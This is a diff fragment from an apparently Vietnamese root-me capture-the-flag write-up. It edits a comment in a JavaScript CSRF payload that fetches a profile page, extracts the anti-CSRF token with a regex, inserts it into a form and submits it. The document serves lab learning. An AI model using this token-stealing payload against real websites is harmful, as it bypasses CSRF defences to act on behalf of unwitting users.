@@ -32,7 +32,7 @@ Một vài lưu ý nhỏ là bot ở root-me khá lâu đời rồi nên không 
 		var results = this.responseText;
 		var token = results.match(/name="token" value="(.*)"/)[1];
 		document.getElementById("token").setAttribute("value", token);
-		document.forms[0].submit(); // submit post form sau khi trộm được token và set.
+		document.forms[0].submit(); // submit post form sau khi trộm được token và set attr.
 	}
 
 	xhttp.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile"); // get request đến profile để trộm token.
